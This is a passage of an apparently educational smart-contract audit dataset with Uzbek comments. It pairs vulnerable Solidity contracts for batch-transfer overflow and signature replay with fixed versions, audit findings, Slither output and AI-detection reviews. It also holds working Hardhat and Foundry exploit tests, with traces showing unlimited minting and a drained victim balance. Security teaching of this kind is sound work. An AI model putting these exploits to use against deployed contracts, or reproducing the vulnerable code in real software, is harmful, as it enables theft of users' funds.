    mapping(address => uint256) public balances;
    string public name = "Vulnerable Batch Token";
    string public symbol = "VBT";

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = _initialSupply;
    }

    function batchTransfer(address[] memory _receivers, uint256 _value) public returns (bool) {
        uint256 cnt = _receivers.length;
        // [XATO]: Overflow! Agar cnt = 2 va _value = 2^255 bo'lsa:
        // amount = 2 * 2^255 = 2^256 = 0 (uint256 chegarasidan oshadi)
        uint256 amount = cnt * _value;

        // balances[msg.sender] >= 0 har doim TRUE bo'ladi!
        require(cnt > 0 && cnt <= 20, "Noto'g'ri qabul qiluvchilar soni");
        require(_value > 0, "Qiymat 0 dan katta bo'lsin");
        require(balances[msg.sender] >= amount, "Balans yetarli emas");

        balances[msg.sender] = balances[msg.sender] - amount;
        for (uint256 i = 0; i < cnt; i++) {
            balances[_receivers[i]] = balances[_receivers[i]] + _value;
        }
        return true;
    }
}`,
    fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title BatchTokenTransferSecure (TUZATILGAN XAVFSIZ VERSIYA)
 * @notice Solidity 0.8+ o'rnatilgan Checked Arithmetic va qat'iy tekshiruvlar
 */
contract BatchTokenTransferSecure {
    mapping(address => uint256) public balances;
    string public name = "Secure Batch Token";
    string public symbol = "SBT";

    constructor(uint256 _initialSupply) {
        balances[msg.sender] = _initialSupply;
    }

    function batchTransfer(address[] calldata _receivers, uint256 _value) external returns (bool) {
        uint256 cnt = _receivers.length;
        require(cnt > 0 && cnt <= 20, "Qabul qiluvchilar soni 1-20 oralig'ida bo'lsin");
        require(_value > 0, "Qiymat 0 dan katta bo'lsin");

        // Solidity 0.8+ da ko'paytirish toshib ketsa tranzaksiya avtomatik REVERT bo'ladi (Panic 0x11)
        uint256 totalAmount = cnt * _value;

        require(balances[msg.sender] >= totalAmount, "Balans yetarli emas");

        balances[msg.sender] -= totalAmount;
        for (uint256 i = 0; i < cnt; i++) {
            require(_receivers[i] != address(0), "Nol manzilga jo'natib bo'lmaydi");
            balances[_receivers[i]] += _value;
        }
        return true;
    }
}`,
    fixDiffNotes: [
      'Solidity versiyasi zamonaviy 0.8.20 ga ko‘tarildi, bunda barcha arifmetik amallar avtomatik overflow/underflow uchun tekshiriladi.',
      'Agar cnt * _value toshsa, EVM Panic(0x11) tashlab butun tranzaksiyani revert qiladi.',
      'Zero-address (_receivers[i] != address(0)) xavfsizlik tekshiruvi qo‘shildi.',
      'Calldata parametrlari orqali gaz optimizatsiyasi amalga oshirildi.'
    ],
    findings: [
      {
        id: 'FIND-004',
        title: 'Batch Overflow Allows Arbitrary Token Minting',
        severity: 'HIGH',
        category: 'integer_overflow',
        swcId: 'SWC-101',
        cweId: 'CWE-190',
        vulnerableLines: [19, 23],
        description: 'batchTransfer funksiyasida SafeMath ishlatilmagani sababli cnt * _value amali uint256 to‘lishiga va 0 ga tenglashishiga olib keladi.',
        impact: 'Hujumchi 0 ta token bilan istalgancha milliardlab tokenlarni yangidan yaratib o‘z hamyonlariga o‘tkazib oladi.',
        rootCause: 'Solidity 0.8.0 dan oldingi versiyalarda checked arithmetic yo‘qligi va toshish tekshiruvi kiritilmagani.',
        recommendation: 'Solidity ^0.8.0 versiyasiga o‘ting yoki OpenZeppelin SafeMath kutubxonasidan foydalaning.',
        aiDetection: {
          status: 'correct',
          aiSummary: 'AI batchTransfer-dagi overflow zaifligini va BEC token keysiga o‘xshashligini to‘liq qayd etdi.',
          humanCritique: 'AI to‘g‘ri topdi, ammo Solidity 0.8.x da unchecked{} bloklarining yangi xavf-xatarlarini qo‘shimcha eslatib o‘tmadi.'
        }
      }
    ],
    slitherReport: {
      summary: 'Slither v0.10.2: 1 HIGH (integer-overflow/divide-before-multiply).',
      issues: [
        {
          id: 'SLITHER-06',
          check: 'tautological-compare',
          impact: 'HIGH',
          confidence: 'High',
          description: 'BatchTokenTransfer.batchTransfer: amount = cnt * _value can overflow in Solidity 0.7.6 without SafeMath.',
          lines: [19],
          recommendation: 'Upgrade to Solidity 0.8+ or use SafeMath for all arithmetic operations.'
        }
      ]
    },
    exploitScenario: {
      testFramework: 'Hardhat',
      testFileName: 'BatchOverflow.test.ts',
      testCode: `import { expect } from "chai";
import { ethers } from "hardhat";

describe("BatchTransfer Overflow Exploit (BEC style)", function () {
  it("Attacker mints 2^255 tokens with zero initial balance", async function () {
    const [deployer, attacker, receiver2] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("BatchTokenTransfer");
    const token = await Token.deploy(1000000);

    // 2^255 qiymati (hex: 0x8000000000000000000000000000000000000000000000000000000000000000)
    const overflowVal = ethers.BigNumber.from("2").pow(255);
    const receivers = [attacker.address, receiver2.address];

    // Attacker balansida 0 token bor
    expect(await token.balances(attacker.address)).to.equal(0);

    // 2 * 2^255 = 2^256 = 0 (OVERFLOW!)
    await token.connect(attacker).batchTransfer(receivers, overflowVal);

    // Endi attacker hisobida 2^255 ta token mavjud!
    const attackerBal = await token.balances(attacker.address);
    expect(attackerBal).to.equal(overflowVal);
    console.log("Hujumchi yangi balansi:", attackerBal.toString());
  });
});`,
      initialState: {
        contractBalance: '0 Token (Deployer: 1,000,000 VBT)',
        attackerBalance: '0 VBT',
        victimDeposit: 'Bozor likvidligi'
      },
      exploitTrace: [
        { step: 1, actor: 'Attacker', action: 'receivers = [attacker, receiver2], value = 2^255', gasUsed: '21,000', stateDelta: 'cnt = 2', status: 'success' },
        { step: 2, actor: 'BatchTokenTransfer', action: 'amount = 2 * 2^255 (EVM 256-bit registers)', gasUsed: '15,000', stateDelta: 'amount = 0 [OVERFLOW TO 0]', status: 'hijacked' },
        { step: 3, actor: 'BatchTokenTransfer', action: 'require(balances[attacker] >= 0) -> TRUE', gasUsed: '8,000', stateDelta: 'Tekshiruv chetlab o‘tildi!', status: 'hijacked' },
        { step: 4, actor: 'BatchTokenTransfer', action: 'balances[attacker] += 2^255', gasUsed: '32,000', stateDelta: 'Haker hisobiga 5.789 * 10^76 token qo‘shildi', status: 'hijacked' }
      ],
      finalStateVulnerable: {
        contractBalance: 'Milliardlab token havoga uchdi',
        attackerBalance: '2^255 VBT (Cheksiz generatsiya)',
        lossPct: 'Token giperinflyatsiyaga uchrab qiymati $0 ga tushdi'
      },
      finalStatePatched: {
        contractBalance: '1,000,000 SBT saqlab qolindi',
        attackerBalance: '0 SBT',
        result: 'Transaction Reverted: Panic(0x11) - Arithmetic overflow detected'
      }
    }
  },
  {
    id: 'case-signature-replay',
    title: 'Signature Replay Attack / Gasless Transfer',
    fileName: 'SignatureReplay.sol',
    category: 'signature_replay',
    severity: 'HIGH',
    summary: 'Metatranzaksiyalarda Nonce va ChainId validatsiyasi yo‘qligi sababli foydalanuvchining bir martalik imzosini o‘g‘irlab, hisobni cheksiz takroriy chaqiriqlar orqali bo‘shatish.',
    historicalIncident: {
      name: 'Wintermute & Multichain AnySwap Signature Exploits',
      date: 'Iyun 2022',
      stolenAmount: '$8M+ (Signature Malleability / Replay)',
      victim: 'Cross-chain Bridges & Permit Meta-Transactions',
      summary: 'Foydalanuvchi imzolagan tranzaksiya maʼlumotlarida unikal nonce yoki domenni ajratuvchi parametrlar bo‘lmagani tufayli bitta imzo bilan qurbonning butun balansi o‘g‘irlangan.'
    },
    manualAuditChecklist: [
      {
        id: 'chk-sig-1',
        task: 'transferWithSig funksiyasida nonce parametr mavjudligini tekshiring.',
        hint: 'transferWithSig faqat from, to, amount qabul qiladi. Har bir foydalanuvchi uchun unikal incrementing nonce yo‘q.',
        completed: false
      },
      {
        id: 'chk-sig-2',
        task: 'EIP-712 DOMAIN_SEPARATOR va block.chainid tekshirilganmi?',
        hint: 'Yo‘q! Oddiy keccak256 orqali xesh qilingan, tarmoqlararo (cross-chain replay) ham himoyalanmagan.',
        completed: false
      },
      {
        id: 'chk-sig-3',
        task: 'ecrecover qaytargan signer manzil nol (address(0)) ga tekshirilganmi?',
        hint: 'Nol manzil tekshiruvi yo‘q, buzilgan imzo kiritilsa signer = address(0) qaytishi mumkin.',
        completed: false
      }
    ],
    vulnerableCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SignatureReplay (ZAIF VERSIYA)
 * @notice Gasless transfer / Meta-tranzaksiya orqali token o'tkazish
 * @dev ZAIFLIK: SWC-121 (Missing Protection against Signature Replay Attacks)
 *      Nonce va chainId yo'q, xuddi shu imzoni qayta-qayta ishlatib hisobni bo'shatish mumkin.
 */
contract SignatureReplay {
    mapping(address => uint256) public balances;

    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor() {
        balances[msg.sender] = 1_000_000;
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    // [XATO]: Nonce yoki ChainId tekshiruvi yo'q! Imzo istalgancha takrorlanadi
    function transferWithSig(
        address from,
        address to,
        uint256 amount,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external {
        bytes32 messageHash = keccak256(abi.encodePacked(from, to, amount));
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash)
        );

        address signer = ecrecover(ethSignedMessageHash, v, r, s);
        require(signer == from, "Yaroqsiz imzo");
        require(balances[from] >= amount, "Mablag' yetarli emas");

        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(from, to, amount);
    }
}`,
    fixedCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title SignatureReplaySecure (TUZATILGAN XAVFSIZ VERSIYA)
 * @notice EIP-712 domen ajratgichi, inkremental Nonce va ChainId orqali qayta imzo hujumini to'liq bloklaydi
 */
contract SignatureReplaySecure {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public nonces;

    bytes32 public immutable DOMAIN_SEPARATOR;
    bytes32 public constant TRANSFER_TYPEHASH =
        keccak256("TransferWithSig(address from,address to,uint256 amount,uint256 nonce)");

    event Transfer(address indexed from, address indexed to, uint256 amount);

    constructor() {
        DOMAIN_SEPARATOR = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256(bytes("SecureToken")),
                keccak256(bytes("1")),
                block.chainid,
                address(this)
            )
        );
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transferWithSig(
        address from,
        address to,
        uint256 amount,
        bytes32 r,
        bytes32 s,
        uint8 v
    ) external {
        // 1. Har bir tranzaksiyada Nonce oshiriladi
        uint256 currentNonce = nonces[from]++;

        // 2. EIP-712 TypeHash bilan structHash hisoblanadi
        bytes32 structHash = keccak256(
            abi.encode(TRANSFER_TYPEHASH, from, to, amount, currentNonce)
        );
        bytes32 digest = keccak256(
            abi.encodePacked("\\x19\\x01", DOMAIN_SEPARATOR, structHash)
        );

        address signer = ecrecover(digest, v, r, s);
        require(signer != address(0) && signer == from, "Yaroqsiz imzo");
        require(balances[from] >= amount, "Mablag' yetarli emas");

        balances[from] -= amount;
        balances[to] += amount;

        emit Transfer(from, to, amount);
    }
}`,
    fixDiffNotes: [
      'EIP-712 standartiga muvofiq DOMAIN_SEPARATOR joriy etildi (chainId va verifyingContract kiritildi).',
      'Inkremental `nonces[from]++` hisobi qo‘shildi; bir imzo ikkinchi marta o‘tmaydi.',
      'ecrecover nol manzil (signer != address(0)) tekshiruvi bilan mustahkamlandi.'
    ],
    findings: [
      {
        id: 'FIND-005',
        title: 'Missing Replay Protection in Off-chain Signature Verification',
        severity: 'HIGH',
        category: 'signature_replay',
        swcId: 'SWC-121',
        cweId: 'CWE-347',
        vulnerableLines: [22, 29],
        description: 'transferWithSig() funksiyasida nonce yoki chainId tekshiruvi mavjud emas. Bitta imzo tajovuzkor tomonidan butun hisob bo‘shaguniga qadar takrorlanishi mumkin.',
        impact: 'Foydalanuvchi bitta tranzaksiya uchun imzo berishi bilan tajovuzkor butun depozitni tortib oladi.',
        rootCause: 'Xabar xeshida inkremental nonce va EIP-712 domendan foydalanilmagani.',
        recommendation: 'EIP-712 standartini joriy qiling, xashga nonces[from] va block.chainid qo‘shing.',
        aiDetection: {
          status: 'correct',
          aiSummary: 'AI funksiyada nonce yo‘qligini va replay attack ehtimolini aniqladi.',
          humanCritique: 'AI to‘g‘ri aniqladi, ammo EIP-712 TypeHash arxitekturasini kodda to‘liq ko‘rsatib bermadi.'
        }
      }
    ],
    slitherReport: {
      summary: 'Slither v0.10.2: 1 HIGH (missing-zero-check), 1 MEDIUM (ecrecover-zero).',
      issues: [
        {
          id: 'SLITHER-07',
          check: 'missing-zero-check',
          impact: 'HIGH',
          confidence: 'High',
          description: 'SignatureReplay.transferWithSig does not verify signer != address(0).',
          lines: [29],
          recommendation: 'Add require(signer != address(0)) to prevent address(0) approvals.'
        }
      ]
    },
    exploitScenario: {
      testFramework: 'Foundry',
      testFileName: 'SignatureReplayExploit.t.sol',
      testCode: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../contracts/SignatureReplay.sol";
import "../contracts/SignatureReplaySecure.sol";

contract SignatureReplayExploitTest is Test {
    SignatureReplay vulnerableContract;
    SignatureReplaySecure secureContract;

    uint256 victimPrivateKey = 0xA11CE;
    address victim;
    address attacker = address(0xBAD);

    function setUp() public {
        victim = vm.addr(victimPrivateKey);
        vulnerableContract = new SignatureReplay();
        secureContract = new SignatureReplaySecure();

        vm.deal(victim, 20 ether);
        vm.prank(victim);
        vulnerableContract.deposit{value: 10 ether}();
        vm.prank(victim);
        secureContract.deposit{value: 10 ether}();
    }

    function testSignatureReplayDrain() public {
        bytes32 messageHash = keccak256(abi.encodePacked(victim, attacker, uint256(1 ether)));
        bytes32 ethSignedMessageHash = keccak256(
            abi.encodePacked("\\x19Ethereum Signed Message:\\n32", messageHash)
        );

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPrivateKey, ethSignedMessageHash);

        // 1-marta qonuniy transfer
        vulnerableContract.transferWithSig(victim, attacker, 1 ether, r, s, v);

        // Hujumchi shu bitta imzoni yana 9 marta qayta-qayta chaqiradi (REPLAY ATTACK!)
        for (uint256 i = 0; i < 9; i++) {
            vulnerableContract.transferWithSig(victim, attacker, 1 ether, r, s, v);
        }

        // Qurbon hisobi 100% bo'shatildi!
        assertEq(vulnerableContract.balances(victim), 0);
        assertEq(vulnerableContract.balances(attacker), 10 ether);
    }
}`,
      initialState: {
        contractBalance: '10.0 ETH',
        attackerBalance: '0.0 ETH',
        victimDeposit: '10.0 ETH'
      },
      exploitTrace: [
        { step: 1, actor: 'Victim', action: 'Signs 1 ETH transfer with private key', gasUsed: '0', stateDelta: 'Off-chain signature (r,s,v) generated', status: 'success' },
        { step: 2, actor: 'Attacker', action: 'transferWithSig() [1-chaqiriq]', gasUsed: '34,000', stateDelta: 'Victim = 9 ETH, Attacker = 1 ETH', status: 'success' },
        { step: 3, actor: 'Attacker', action: 'transferWithSig() [2..10-chaqiriqlar / Replay]', gasUsed: '280,000', stateDelta: 'Xuddi shu imzo yana 9 marta ishlatildi!', status: 'hijacked' }
      ],
      finalStateVulnerable: {
        contractBalance: '0.0 ETH',
        attackerBalance: '10.0 ETH o‘g‘irlandi',
        lossPct: '100% Jamg‘arma 1 ta imzo orqali yo‘qotildi'
      },
      finalStatePatched: {
        contractBalance: '10.0 ETH saqlab qolindi',
        attackerBalance: '1.0 ETH (faqat ruxsat berilgan 1 ETH)',
        result: 'Transaction Reverted: Yaroqsiz imzo (nonce oshgani sababli replay bloklandi)'
      }
    }
  }
];
